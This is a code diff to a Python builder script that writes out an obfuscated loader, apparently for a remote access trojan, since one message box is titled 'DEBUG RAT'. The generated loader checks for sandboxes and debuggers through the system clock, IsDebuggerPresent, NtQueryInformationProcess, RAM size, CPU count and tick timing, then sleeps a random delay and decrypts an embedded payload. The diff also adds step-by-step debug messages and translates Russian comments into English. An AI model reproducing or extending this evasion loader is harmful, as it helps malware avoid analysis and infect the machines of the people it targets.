@@ -30,10 +30,10 @@ def generate_loader(original_code):
     return f'''# ============ {dec_name} ============
 import base64,zlib,sys,ctypes,time,random
 
-# ============ ДЕБАГ: MESSAGEBOX ============
+# ============ DEBUG: MESSAGEBOX ============
 def show_debug(msg):
     try:
-        ctypes.windll.user32.MessageBoxW(0, msg, "DEBUG", 0)
+        ctypes.windll.user32.MessageBoxW(0, msg, "DEBUG RAT", 0)
     except:
         pass
 
@@ -42,17 +42,17 @@ show_debug("STEP 1: Loader started!")
 def _check_sandbox():
     try:
         if time.time() < 1600000000:
-            show_debug("STEP 2: Sandbox detected - TIME")
+            show_debug("STEP 2: Sandbox - TIME")
             return True
         if ctypes.windll.kernel32.IsDebuggerPresent():
-            show_debug("STEP 2: Sandbox detected - DEBUGGER")
+            show_debug("STEP 2: Sandbox - DEBUGGER")
             return True
         try:
             ntdll = ctypes.windll.ntdll
             status = ctypes.c_ulong()
             ntdll.NtQueryInformationProcess(ctypes.windll.kernel32.GetCurrentProcess(), 0, ctypes.byref(status), 4, None)
             if status.value & 0x1000000:
-                show_debug("STEP 2: Sandbox detected - NtQuery")
+                show_debug("STEP 2: Sandbox - NtQuery")
                 return True
         except:
             pass
@@ -66,13 +66,12 @@ def _check_sandbox():
         mem.dwLength = ctypes.sizeof(MEM)
         if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem)):
             if mem.ullTotalPhys < 2 * 1024 * 1024 * 1024:
-                show_debug(f"STEP 2: Sandbox detected - RAM: {{mem.ullTotalPhys}}")
+                show_debug(f"STEP 2: Sandbox - RAM: {{mem.ullTotalPhys}}")
                 return True
         try:
             import psutil
-            cpu_count = psutil.cpu_count()
-            if cpu_count < 2:
-                show_debug(f"STEP 2: Sandbox detected - CPU: {{cpu_count}}")
+            if psutil.cpu_count() < 2:
+                show_debug(f"STEP 2: Sandbox - CPU: {{psutil.cpu_count()}}")
                 return True
         except:
             pass
@@ -80,7 +79,7 @@ def _check_sandbox():
         time.sleep(0.1)
         t2 = ctypes.windll.kernel32.GetTickCount()
         if t2 - t1 < 10:
-            show_debug("STEP 2: Sandbox detected - TICK")
+            show_debug("STEP 2: Sandbox - TICK")
             return True
         return False
     except Exception as e:
@@ -100,8 +99,10 @@ if _check_sandbox():
 
 show_debug("STEP 5: No sandbox - continuing")
 
-show_debug(f"STEP 6: Waiting {random.randint(15, 45)} seconds...")
-time.sleep(random.randint(15, 45))
+import random
+wait_time = random.randint(15, 45)
+show_debug(f"STEP 6: Waiting {{wait_time}} seconds...")
+time.sleep(wait_time)
 show_debug("STEP 7: Wait finished")
 
 show_debug("STEP 8: Starting decryption...")
@@ -145,7 +146,7 @@ def main():
     
     print("[+] loader_obf.py created with DEBUG!")
     print("[+] Build size: ~22-25 MB")
-    print("[+] МessageBox будет показывать каждый шаг!")
+    print("[+] MessageBox will show each step!")
 
 if __name__ == "__main__":
     main()
